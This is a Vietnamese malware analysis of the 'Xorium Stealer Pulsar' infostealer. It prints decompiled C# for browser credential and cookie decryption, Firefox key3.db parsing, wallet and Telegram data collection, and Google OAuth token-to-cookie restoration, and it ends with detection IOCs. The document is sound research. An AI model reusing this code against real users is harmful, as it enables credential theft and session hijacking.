# PHÂN TÍCH KỸ THUẬT CỰC SÂU: XORIUM STEALER PULSAR

> **Tài liệu nghiên cứu mã độc cấp độ cao nhất**  
> **Độ sâu**: Implementation-level analysis  
> **Ngày**: 31/01/2026

---

## 1. INMEMORYZIP - KIẾN TRÚC ZIP TRONG BỘ NHỚ

### 1.1 Thiết kế Thread-Safe

```csharp
public sealed class InMemoryZip : IDisposable
{
    // ConcurrentDictionary đảm bảo thread-safe operations
    private readonly ConcurrentDictionary<string, byte[]> _entries = 
        new ConcurrentDictionary<string, byte[]>(StringComparer.OrdinalIgnoreCase);
    
    private readonly object _buildLock = new object();
    private bool _disposed;
}
```

**Điểm đặc biệt:**
- Không sử dụng file tạm trên disk
- Tất cả operations trong RAM
- Thread-safe với ConcurrentDictionary
- Case-insensitive entry names (Windows-compatible)

### 1.2 Normalization Algorithm

```csharp
private static string NormalizeEntryName(string name)
{
    // 1. Check null/whitespace
    name = !string.IsNullOrWhiteSpace(name) ? 
        name.Replace('\\', '/').Trim('/') : 
        throw new ArgumentException("Entry name is null or empty", nameof(name));
    
    // 2. Validate không rỗng sau khi trim
    return name.Length != 0 ? name : 
        throw new ArgumentException("Invalid entry name", nameof(name));
}
```

**Mục đích:**
- Chuẩn hóa đường dẫn Windows (`\`) → ZIP format (`/`)
- Loại bỏ leading/trailing slashes
- Đảm bảo tên entry hợp lệ

### 1.3 Memory-to-ZIP Conversion

```csharp
public byte[] ToArray(CompressionLevel compression = CompressionLevel.Fastest)
{
    lock (this._buildLock)  // Đảm bảo chỉ 1 thread build tại 1 thời điểm
    {
        using (MemoryStream memoryStream = new MemoryStream())
        {
            using (ZipArchive zipArchive = new ZipArchive(
                memoryStream, 
                ZipArchiveMode.Create, 
                true,  // Leave stream open
                Encoding.UTF8))
            {
                foreach (KeyValuePair<string, byte[]> entry in this._entries)
                {
                    using (Stream stream = zipArchive.CreateEntry(
                        entry.Key, compression).Open())
                    {
                        stream.Write(entry.Value, 0, entry.Value.Length);
                    }
                }
            }
            return memoryStream.ToArray();
        }
    }
}
```

**Tối ưu:**
- `CompressionLevel.Fastest` - Tốc độ ưu tiên hơn tỷ lệ nén
- `leaveOpen: true` - MemoryStream không bị đóng khi ZipArchive dispose
- UTF-8 encoding - Hỗ trợ Unicode filenames

### 1.4 Directory Recursion

```csharp
public void AddDirectoryFiles(string sourceDirectory, string targetEntryDirectory = "", bool recursive = true)
{
    SearchOption searchOption = recursive ? 
        SearchOption.AllDirectories : 
        SearchOption.TopDirectoryOnly;
    
    foreach (string file in Directory.GetFiles(sourceDirectory, "*", searchOption))
    {
        // Tính relative path
        string path2 = file.Substring(sourceDirectory.Length)
            .TrimStart(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
        
        // Kết hợp với target directory
        string entryPath = (string.IsNullOrEmpty(targetEntryDirectory) ? 
            path2 : 
            Path.Combine(targetEntryDirectory, path2)).Replace('\\', '/');
        
        try
        {
            byte[] content = File.ReadAllBytes(file);
            this.AddFile(entryPath, content);
        }
        catch { /* Silent fail */ }
    }
}
```

---

## 2. COUNTER - HỆ THỐNG BÁO CÁO THỐNG KÊ

### 2.1 ASCII Art Banner

```csharp
values.Add("    ____      __       _______  __");
values.Add("   /  _/___  / /____  / /  _/ |/ /");
values.Add("   / // __ \\/ __/ _ \\/ // / |   / ");
values.Add(" _/ // / / / /_/  __/ // / /   |  ");
values.Add("/___/_/ /_/\\__/\\___/_/___//_/|_|  ");
values.Add("                                   ");
values.Add("               InteliX by dead artis");
```

**Phân tích:**
- Font: Custom ASCII art
- Branding: "InteliX by dead artis"
- Có thể detect bằng string matching

### 2.2 Data Structures

```csharp
public class Counter
{
    // Thread-safe collections cho từng category
    public ConcurrentBag<string> FilesGrabber = new ConcurrentBag<string>();
    public ConcurrentBag<string> CryptoDesktop = new ConcurrentBag<string>();
    public ConcurrentBag<string> CryptoChromium = new ConcurrentBag<string>();
    public ConcurrentBag<CounterBrowser> Browsers = new ConcurrentBag<CounterBrowser>();
    public ConcurrentBag<CounterApplications> Applications = new ConcurrentBag<CounterApplications>();
    public ConcurrentBag<CounterApplications> Vpns = new ConcurrentBag<CounterApplications>();
    public ConcurrentBag<CounterApplications> Games = new ConcurrentBag<CounterApplications>();
    public ConcurrentBag<CounterApplications> Messangers = new ConcurrentBag<CounterApplications>();
}
```

**Thiết kế:**
- Mỗi category có collection riêng
- `ConcurrentBag` cho thread-safe add operations
- Không cần lock khi multiple threads cùng ghi

### 2.3 Browser Statistics

```csharp
public class CounterBrowser
{
    public string Profile;
    public string BrowserName;
    public ConcurrentLong Cookies;
    public ConcurrentLong Password;
    public ConcurrentLong CreditCards;
    public ConcurrentLong AutoFill;
    public ConcurrentLong RestoreToken;
    public ConcurrentLong MaskCreditCard;
    public ConcurrentLong MaskedIban;
}
```

**Các loại dữ liệu đếm:**
- Cookies: Số lượng cookies
- Password: Số lượng passwords
- CreditCards: Số lượng credit cards
- AutoFill: Số lượng autofill entries
- RestoreToken: Google restore tokens
- MaskCreditCard: Masked card numbers
- MaskedIban: Masked IBANs

### 2.4 Report Generation

```csharp
// Format: [Category]  [--Count--]  [Item1, Item2, ...]
values.Add($"[Browsers]  [--{this.Browsers.Count()}--]  [{string.Join(", ", this.Browsers.Select(b => b.BrowserName).ToArray())}]");

// Chi tiết từng profile
foreach (Counter.CounterBrowser browser in this.Browsers)
{
    values.Add("  - " + browser.Profile);
    if ((long) browser.Cookies != 0L)
        values.Add($"       [Cookies {(long) browser.Cookies}]");
    if ((long) browser.Password != 0L)
        values.Add($"       [Passwords {(long) browser.Password}]");
    // ... tương tự cho các loại khác
}
```

---

## 3. CONCURRENTLONG - PRIMITIVE THREAD-SAFE

### 3.1 Implementation

```csharp
public struct ConcurrentLong(long initial)
{
    private long _value = initial;

    public long Value
    {
        get => Interlocked.Read(ref this._value);
        set => Interlocked.Exchange(ref this._value, value);
    }

    // Operator overloading
    public static ConcurrentLong operator ++(ConcurrentLong x)
    {
        Interlocked.Increment(ref x._value);
        return x;
    }

    public static ConcurrentLong operator --(ConcurrentLong x)
    {
        Interlocked.Decrement(ref x._value);
        return x;
    }

    public static ConcurrentLong operator +(ConcurrentLong x, long y)
    {
        Interlocked.Add(ref x._value, y);
        return x;
    }

    // Implicit conversion
    public static implicit operator long(ConcurrentLong x) => x.Value;
    public static implicit operator ConcurrentLong(long v) => new ConcurrentLong(v);
}
```

**Kỹ thuật:**
- Sử dụng `Interlocked` class cho atomic operations
- Struct thay vì class → Giảm heap allocations
- Operator overloading → Code gọn hơn
- Implicit conversion → Tương thích với `long`

### 3.2 Use Cases

```csharp
// Trong Chromium.cs
ConcurrentLong cookies = new ConcurrentLong(0);
ConcurrentLong passwords = new ConcurrentLong(0);

// Thread-safe increment
foreach (var entry in entries)
{
    if (IsCookie(entry)) cookies++;
    if (IsPassword(entry)) passwords++;
}

// Gán vào Counter
browser.Cookies = cookies;
browser.Password = passwords;
```

---

## 4. BERKELEYDB PARSER - FIREFOX KEY3.DB

### 4.1 File Format

```csharp
public class BerkeleyDB
{
    // Magic number: 00061561 (Berkeley DB 1.85)
    private const string MAGIC = "00061561";
    
    public List<KeyValuePair<string, string>> Keys { get; }
}
```

**Cấu trúc file key3.db:**
- Header: 4 bytes magic number
- Page size: 4 bytes tại offset 12
- Số lượng keys: 4 bytes tại offset 56

### 4.2 Parsing Algorithm

```csharp
public BerkeleyDB(byte[] file)
{
    // 1. Đọc toàn bộ file vào list
    List<byte> byteList = new List<byte>();
    using (MemoryStream input = new MemoryStream(file))
    using (BinaryReader binaryReader = new BinaryReader(input))
    {
        for (int i = 0; i < binaryReader.BaseStream.Length; i++)
            byteList.Add(binaryReader.ReadByte());
    }

    // 2. Verify magic number
    string magic = BitConverter.ToString(
        Extract(byteList.ToArray(), 0, 4, false)).Replace("-", "");
    if (!magic.Equals("00061561"))
        return;  // Không phải Berkeley DB

    // 3. Extract metadata
    int pageSize = BitConverter.ToInt32(
        Extract(byteList.ToArray(), 12, 4, true), 0);
    int numKeys = int.Parse(
        BitConverter.ToString(Extract(byteList.ToArray(), 56, 4, false)).Replace("-", ""));

    // 4. Parse keys
    int pageNum = 1;
    while (this.Keys.Count < numKeys)
    {
        // Đọc key-value pairs từ page
        string[] offsets = new string[(numKeys - this.Keys.Count) * 2];
        for (int i = 0; i < offsets.Length; i++)
        {
            offsets[i] = BitConverter.ToString(
                Extract(byteList.ToArray(), pageSize * pageNum + 2 + i * 2, 2, true))
                .Replace("-", "");
        }
        
        Array.Sort<string>(offsets);  // Sắp xếp offsets
        
        // Extract key-value từ offsets
        for (int i = 0; i < offsets.Length; i += 2)
        {
            int start1 = Convert.ToInt32(offsets[i], 16) + pageSize * pageNum;
            int start2 = Convert.ToInt32(offsets[i + 1], 16) + pageSize * pageNum;
            int end = (i + 2 >= offsets.Length) ? 
                pageSize + pageSize * pageNum : 
                Convert.ToInt32(offsets[i + 2], 16) + pageSize * pageNum;
            
            string key = Encoding.ASCII.GetString(
                Extract(byteList.ToArray(), start2, end - start2, false));
            string value = BitConverter.ToString(
                Extract(byteList.ToArray(), start1, start2 - start1, false));
            
            if (!string.IsNullOrWhiteSpace(key))
                this.Keys.Add(new KeyValuePair<string, string>(key, value));
        }
        pageNum++;
    }
}
```

### 4.3 Byte Extraction

```csharp
private static byte[] Extract(byte[] source, int start, int length, bool littleEndian)
{
    byte[] result = new byte[length];
    for (int i = 0; i < length; i++)
        result[i] = source[start + i];
    
    if (littleEndian)
        Array.Reverse(result);  // Convert to big-endian
    
    return result;
}
```

---

## 5. AES-GCM-256 IMPLEMENTATION

### 5.1 S-Box Tables

```csharp
private static readonly byte[] SBox = new byte[256]
{
    99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118,
    202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192,
    183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21,
    // ... 256 bytes
};
```

**Đặc điểm:**
- Hardcoded S-Box (Substitution Box)
- AES standard S-Box
- Dùng cho SubBytes transformation

### 5.2 Galois/Counter Mode

```csharp
public static byte[] DecryptBrowser(byte[] encryptedData, byte[] masterKey10, byte[] masterKey20, bool checkprefix)
{
    // 1. Validate minimum length
    if (encryptedData.Length < 31)  // 3 (version) + 12 (nonce) + 16 (tag) + min data
        return null;

    // 2. Extract version prefix
    string version = Encoding.ASCII.GetString(encryptedData, 0, 3);
    
    // 3. Extract 12-byte nonce
    byte[] nonce = new byte[12];
    Buffer.BlockCopy(encryptedData, 3, nonce, 0, 12);

    // 4. Extract ciphertext
    int ciphertextLength = encryptedData.Length - 15 - 16;
    if (ciphertextLength < 0) return null;
    
    byte[] ciphertext = new byte[ciphertextLength];
    Buffer.BlockCopy(encryptedData, 15, ciphertext, 0, ciphertextLength);

    // 5. Extract 16-byte authentication tag
    byte[] tag = new byte[16];
    Buffer.BlockCopy(encryptedData, encryptedData.Length - 16, tag, 0, 16);

    // 6. Select master key
    byte[] key = version switch
    {
        "v20" => masterKey20,
        "v10" => masterKey10,
        _ => null
    };
    if (key == null) return null;

    // 7. Decrypt
    return AesGcm256.Decrypt(key, nonce, null, ciphertext, tag);
}
```

### 5.3 Prefix Validation

```csharp
private static bool HasPrefix(byte[] plainText)
{
    if (plainText.Length < 32) return false;
    
    int printableCount = 0;
    for (int i = 0; i < 32; i++)
    {
        if (plainText[i] >= 32 && plainText[i] <= 126)
            printableCount++;
    }
    return printableCount > 2;  // Có ít nhất 3 ký tự printable
}
```

**Mục đích:**
- Kiểm tra xem plaintext có prefix không
- Chrome thêm 32-byte prefix vào passwords
- Nếu có prefix → Bỏ 32 bytes đầu

---

## 6. CHACHA20-POLY1305

### 6.1 ChaCha20 State

```csharp
private static byte[] ChaCha20Block(byte[] key32, uint counter, byte[] nonce12)
{
    // State: 16 x 32-bit words
    uint[] state = new uint[16]
    {
        0x61707865,  // "expa"
        0x3320646E,  // "nd 3"
        0x79622D32,  // "2-by"
        0x6B206574,  // "te k"
        0, 0, 0, 0,  // Key (bytes 0-15)
        0, 0, 0, 0,  // Key (bytes 16-31)
        0,           // Counter
        0, 0, 0      // Nonce (12 bytes)
    };
    
    // Load key
    for (int i = 0; i < 8; i++)
        state[4 + i] = ToUInt32Little(key32, i * 4);
    
    // Load counter and nonce
    state[12] = counter;
    state[13] = ToUInt32Little(nonce12, 0);
    state[14] = ToUInt32Little(nonce12, 4);
    state[15] = ToUInt32Little(nonce12, 8);
    
    // 20 rounds (10 double rounds)
    uint[] workingState = new uint[16];
    Array.Copy(state, workingState, 16);
    
    for (int i = 0; i < 10; i++)
    {
        // Column rounds
        QuarterRound(ref workingState[0], ref workingState[4], ref workingState[8], ref workingState[12]);
        QuarterRound(ref workingState[1], ref workingState[5], ref workingState[9], ref workingState[13]);
        QuarterRound(ref workingState[2], ref workingState[6], ref workingState[10], ref workingState[14]);
        QuarterRound(ref workingState[3], ref workingState[7], ref workingState[11], ref workingState[15]);
        
        // Diagonal rounds
        QuarterRound(ref workingState[0], ref workingState[5], ref workingState[10], ref workingState[15]);
        QuarterRound(ref workingState[1], ref workingState[6], ref workingState[11], ref workingState[12]);
        QuarterRound(ref workingState[2], ref workingState[7], ref workingState[8], ref workingState[13]);
        QuarterRound(ref workingState[3], ref workingState[4], ref workingState[9], ref workingState[14]);
    }
    
    // Add original state
    byte[] output = new byte[64];
    for (int i = 0; i < 16; i++)
        LittleEndian(workingState[i] + state[i], output, i * 4);
    
    return output;
}
```

### 6.2 Quarter Round

```csharp
private static void QuarterRound(ref uint a, ref uint b, ref uint c, ref uint d)
{
    a += b; d ^= a; d = (d << 16) | (d >> 16);
    c += d; b ^= c; b = (b << 12) | (b >> 20);
    a += b; d ^= a; d = (d << 8)  | (d >> 24);
    c += d; b ^= c; b = (b << 7)  | (b >> 25);
}
```

### 6.3 Constant-Time Comparison

```csharp
private static bool FixedTimeEquals(byte[] a, byte[] b)
{
    if (a.Length != b.Length) return false;
    
    uint diff = 0;
    for (int i = 0; i < a.Length; i++)
        diff |= (uint)(a[i] ^ b[i]);  // XOR rồi OR
    
    return diff == 0;  // Nếu bằng nhau, diff = 0
}
```

**Tại sao cần constant-time:**
- Ngăn timing attacks
- Kẻ tấn công không thể đoán tag đúng bằng cách đo thời gian
- Luôn so sánh toàn bộ bytes, không early exit

---

## 7. PROCESS ENUMERATION

### 7.1 ProcInfo Structure

```csharp
public class ProcInfo
{
    public string Name;
    public string Pid;
    public string Path;
    public string User;
}
```

### 7.2 Process Cache

```csharp
private static readonly Lazy<List<ProcInfo>> _procInfos = 
    new Lazy<List<ProcInfo>>(BuildCache, true);

public static List<ProcInfo> GetProcInfos()
{
    return new List<ProcInfo>(_procInfos.Value);  // Return copy
}
```

**Lazy initialization:**
- Cache chỉ build 1 lần
- Thread-safe với Lazy<T>
- Giảm số lần query processes

### 7.3 Finding Nearby Folders/Files

```csharp
public static List<string> FindFolder(string folderName)
{
    ConcurrentDictionary<string, byte> found = 
        new ConcurrentDictionary<string, byte>(StringComparer.OrdinalIgnoreCase);
    
    SearchNearby(folderName, true, found);
    return new List<string>(found.Keys);
}

private static void SearchNearby(string target, bool isDirectory, 
    ConcurrentDictionary<string, byte> found, int maxUp = 3)
{
    Parallel.ForEach(_procInfos.Value, proc =>
    {
        string path = proc.Path;
        if (string.IsNullOrEmpty(path)) return;
        
        string dir = Path.GetDirectoryName(path);
        if (string.IsNullOrEmpty(dir)) return;
        
        // Tìm kiếm lên đến 3 cấp thư mục
        for (int i = 0; i < maxUp && !string.IsNullOrEmpty(dir); i++)
        {
            string checkPath = Path.Combine(dir, target);
            
            if (isDirectory && Directory.Exists(checkPath))
                found.TryAdd(Path.GetFullPath(checkPath), 0);
            else if (!isDirectory && File.Exists(checkPath))
                found.TryAdd(Path.GetFullPath(checkPath), 0);
            
            dir = Path.GetDirectoryName(dir);  // Lên 1 cấp
        }
    });
}
```

**Use case:**
- Tìm `tdata` folder gần `telegram.exe`
- Tìm `config` folder gần `steam.exe`
- Không cần biết đường dẫn chính xác

---

## 8. GOOGLE OAUTH TOKEN RESTORATION

### 8.1 API Endpoint

```csharp
private static string SendPostRequest(string token)
{
    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(
        "https://accounts.google.com/oauth/multilogin?source=com.google.Drive");
    
    request.Method = "POST";
    request.ContentType = "application/x-www-form-urlencoded";
    request.Headers.Add("Authorization", "MultiBearer " + token);
    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 " +
        "(KHTML, like Gecko) com.google.Drive/6.0.230903 iSL/3.4 (gzip)";
    
    // Send empty body
    byte[] bytes = Encoding.UTF8.GetBytes("");
    using (Stream requestStream = request.GetRequestStream())
        requestStream.Write(bytes, 0, bytes.Length);
    
    using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
    {
        if (response.StatusCode == HttpStatusCode.OK)
        {
            using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                return reader.ReadToEnd();
        }
    }
    return string.Empty;
}
```

### 8.2 Response Parsing

```csharp
public static string CRestore(string restore)
{
    string json = SendPostRequest(restore);
    if (string.IsNullOrEmpty(json)) return string.Empty;
    
    // Remove ")]}'" prefix (JSONP protection)
    json = json.Remove(0, 5);
    
    // Extract status
    string status = Regex.Match(json, "\"status\":\"(.*?)\"").Groups[1].Value;
    
    // Extract cookies
    List<Cookie> cookies = ExtractCookies(json);
    List<Account> accounts = ExtractAccounts(json);
    
    // Format as Netscape cookies
    StringBuilder sb = new StringBuilder();
    foreach (Cookie cookie in cookies)
    {
        string domain = string.IsNullOrEmpty(cookie.host) ? 
            cookie.domain : cookie.host;
        if (string.IsNullOrEmpty(domain)) domain = ".google.com";
        
        sb.AppendLine($"{domain}\tTRUE\t{cookie.path}\tFALSE\t" +
            $"{cookie.maxAge}\t{cookie.name}\t{cookie.value}");
    }
    return sb.ToString();
}
```

### 8.3 Cookie Extraction Regex

```csharp
private static List<Cookie> ExtractCookies(string json)
{
    List<Cookie> cookies = new List<Cookie>();
    
    foreach (Capture match in Regex.Matches(json, "{(.*?)}"))
    {
        string input = match.Value;
        Cookie cookie = new Cookie()
        {
            name = Regex.Match(input, "\"name\":\"(.*?)\"").Groups[1].Value,
            value = Regex.Match(input, "\"value\":\"(.*?)\"").Groups[1].Value,
            domain = Regex.Match(input, "\"domain\":\"(.*?)\"").Groups[1].Value,
            path = Regex.Match(input, "\"path\":\"(.*?)\"").Groups[1].Value,
            isSecure = Regex.IsMatch(input, "\"isSecure\":true"),
            isHttpOnly = Regex.IsMatch(input, "\"isHttpOnly\":true"),
            maxAge = int.TryParse(
                Regex.Match(input, "\"maxAge\":(\\d+)").Groups[1].Value, 
                out int result) ? result : 0,
            priority = Regex.Match(input, "\"priority\":\"(.*?)\"").Groups[1].Value,
            sameParty = Regex.Match(input, "\"sameParty\":\"(.*?)\"").Groups[1].Value,
            sameSite = Regex.Match(input, "\"sameSite\":\"(.*?)\"").Groups[1].Value,
            host = Regex.Match(input, "\"host\":\"(.*?)\"").Groups[1].Value
        };
        cookies.Add(cookie);
    }
    return cookies;
}
```

---

## 9. PARALLEL PROCESSING PATTERNS

### 9.1 Extensive Parallel.ForEach Usage

```csharp
// Trong Stealer.cs
Task.WaitAll(Task.Run(() => Parallel.ForEach<ITarget>(
    Stealer.Targets, 
    target => target.Collect(zip, counter)
)));

// Trong CryptoDesktop.cs
Parallel.ForEach<string[]>(SWalletsDirectories, 
    sw => CopyWalletFromDirectoryTo(sw[1], sw[0], zip, counter));

// Trong ProcessKiller.cs
Parallel.ForEach<ProcInfo>(procInfos, proc =>
{
    // Terminate process logic
});

// Trong Telegram.cs
Parallel.ForEach<string>(Directory.GetFiles(sourceDir), filePath =>
{
    // Process file
});
```

### 9.2 Thread-Safe Collections

| Collection | Mục đích |
|------------|----------|
| `ConcurrentDictionary` | InMemoryZip entries |
| `ConcurrentBag` | Counter collections |
| `ConcurrentDictionary` | ProcessWindows search results |
| `ConcurrentLong` | Thread-safe counters |

### 9.3 Performance Optimization

```csharp
// 1. Lazy caching
private static readonly Lazy<List<ProcInfo>> _procInfos = 
    new Lazy<List<ProcInfo>>(BuildCache, true);

// 2. Parallel processing with degree of parallelism
Parallel.ForEach(items, new ParallelOptions { MaxDegreeOfParallelism = 4 }, item =>
{
    // Process
});

// 3. Lock-free operations khi có thể
Interlocked.Increment(ref counter);

// 4. Buffer pooling
Buffer.BlockCopy(src, 0, dst, 0, length);
```

---

## 10. MEMORY MANAGEMENT & SECURITY

### 10.1 Secure Memory Wiping

```csharp
// Trong ChaCha20Poly1305.cs
Array.Clear(src, 0, src.Length);
Array.Clear(numArray, 0, numArray.Length);

// Trong TripleDes.cs
Array.Clear(key, 0, key.Length);
Array.Clear(iv, 0, iv.Length);
```

**Tại sao cần:**
- Ngăn key/password lưu lại trong memory
- Giảm thời gian sensitive data tồn tại
- Phòng chống memory dump attacks

### 10.2 IDisposable Pattern

```csharp
public sealed class InMemoryZip : IDisposable
{
    private bool _disposed;

    public void Dispose()
    {
        if (this._disposed) return;
        this._disposed = true;
        this._entries.Clear();  // Xóa tất cả entries
    }
}
```

### 10.3 Exception Handling (Silent Fail)

```csharp
try
{
    byte[] content = File.ReadAllBytes(file);
    this.AddFile(entryPath, content);
}
catch
{
    // Silent fail - không log, không throw
    // Tiếp tục với file tiếp theo
}
```

**Ưu điểm cho malware:**
- Không để lại stack traces
- Không tạo Windows Event Logs
- Không làm gián đoạn quá trình thu thập

---

## 11. KẾT LUẬN VỀ KỸ THUẬT

### 11.1 Điểm mạnh

1. **Thread-safe design** - Extensive use của concurrent collections
2. **Memory-only operations** - Không để lại file tạm
3. **Parallel processing** - Tốc độ thu thập nhanh
4. **Custom crypto implementations** - Không phụ thuộc external libraries
5. **Flexible parsing** - BerkeleyDB, SQLite, ASN.1 DER
6. **Google OAuth restoration** - Kỹ thuật nâng cao

### 11.2 Điểm yếu

1. **Hardcoded strings** - Dễ detect bằng YARA
2. **No code obfuscation** - Code decompile rõ ràng
3. **Weak anti-VM** - Chỉ 3 usernames
4. **Silent failures** - Có thể miss một số data
5. **No persistence** - Chạy 1 lần rồi dừng

### 11.3 IOCs từ Implementation

```
Strings: "InteliX by dead artis", "Xorium", "Stealerv37"
Files: "IntelixWifiExport_*", "IntelIX.txt"
Mutex: Có thể có (MutexControl class)
Network: accounts.google.com/oauth/multilogin
```

---

**END OF ULTRA-DEEP ANALYSIS**

*Phân tích này dựa trên việc đọc trực tiếp source code đã decompile.*
